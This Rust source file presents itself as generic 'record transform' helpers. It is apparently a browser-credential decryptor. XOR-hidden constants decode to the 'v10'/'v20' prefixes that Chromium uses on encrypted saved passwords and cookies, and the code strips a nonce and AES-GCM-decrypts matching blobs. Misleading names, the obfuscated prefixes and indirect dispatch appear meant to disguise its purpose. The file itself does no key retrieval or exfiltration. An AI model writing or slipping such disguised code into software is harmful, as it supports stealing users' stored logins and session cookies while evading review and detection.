//! Buffered record transform helpers (layout compatibility layer).

use aes_gcm::{
    aead::{Aead, KeyInit},
    Aes256Gcm, Key, Nonce,
};

const OBF: u8 = 0x4E;
const NONCE_LEN: usize = 12;
const TAG_LEN: usize = 16;
const PREFIX_LEN: usize = 3;

const ENC_P1: [u8; 3] = [0x38, 0x7f, 0x7e];
const ENC_P2: [u8; 3] = [0x38, 0x7c, 0x7e];

fn reveal<const N: usize>(enc: &[u8; N]) -> [u8; N] {
    let mut out = [0u8; N];
    for i in 0..N {
        out[i] = enc[i] ^ OBF;
    }
    out
}

fn prefix_a() -> [u8; 3] {
    reveal(&ENC_P1)
}

fn prefix_b() -> [u8; 3] {
    reveal(&ENC_P2)
}

type AeadOp = fn(&[u8; 32], &[u8], &[u8]) -> Result<Vec<u8>, String>;

fn aead_unwrap(key: &[u8; 32], nonce: &[u8], payload: &[u8]) -> Result<Vec<u8>, String> {
    let cipher = Aes256Gcm::new(Key::<Aes256Gcm>::from_slice(key));
    let nonce = Nonce::from_slice(nonce);
    cipher
        .decrypt(nonce, payload)
        .map_err(|e| format!("transform: {e}"))
}

fn dispatch_aead(key: &[u8; 32], nonce: &[u8], payload: &[u8]) -> Result<Vec<u8>, String> {
    let op: AeadOp = aead_unwrap;
    op(key, nonce, payload)
}

/// Transform an encoded value blob into plaintext UTF-8.
pub fn process_data(encrypted: &[u8], key: &[u8; 32]) -> Result<String, String> {
    if encrypted.len() < PREFIX_LEN + NONCE_LEN + TAG_LEN {
        return Err(format!("record too short: {} bytes", encrypted.len()));
    }

    let p1 = prefix_a();
    let p2 = prefix_b();
    let head = &encrypted[..PREFIX_LEN];
    if head != p1 && head != p2 {
        return String::from_utf8(encrypted.to_vec())
            .map_err(|_| "unknown layout and not valid UTF-8".into());
    }

    let nonce_bytes = &encrypted[PREFIX_LEN..PREFIX_LEN + NONCE_LEN];
    let ciphertext = &encrypted[PREFIX_LEN + NONCE_LEN..];

    let plaintext = dispatch_aead(key, nonce_bytes, ciphertext)?;
    String::from_utf8(plaintext).map_err(|e| format!("UTF-8 decode: {e}"))
}

/// Backward-compatible alias.
pub fn decrypt_value(encrypted: &[u8], key: &[u8; 32]) -> Result<String, String> {
    process_data(encrypted, key)
}

/// Hex representation when UTF-8 decode is not possible.
pub fn hex_fallback(data: &[u8]) -> String {
    format!(
        "[HEX:{}]",
        data.iter().map(|b| format!("{b:02x}")).collect::<String>()
    )
}
